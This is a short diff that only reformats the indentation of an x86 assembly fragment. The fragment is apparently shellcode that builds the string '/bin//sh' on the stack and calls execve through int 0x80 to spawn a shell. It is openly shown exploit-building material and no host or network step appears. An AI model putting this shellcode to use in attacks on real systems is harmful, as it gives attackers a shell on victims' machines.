@@ -114,22 +114,22 @@ _start:
 
 ; Execve
 	; execve syscall number (11)
-    mov al, 11
+  mov al, 11
 
-    ; env
-    xor edx, edx
+  ; env
+  xor edx, edx
 
-    ; argv
-    xor ecx, ecx
+  ; argv
+  xor ecx, ecx
 
-    ;filename
-    push ecx
-    mov ebx, 0x68732f2f
-    push ebx
-    mov ebx, 0x6e69622f
-    push ebx
-    lea ebx, [esp]
+  ; filename
+  push ecx
+  mov ebx, 0x68732f2f
+  push ebx
+  mov ebx, 0x6e69622f
+  push ebx
+  lea ebx, [esp]
 
-    ; execve syscall
-    int 0x80
+  ; execve syscall
+  int 0x80
 
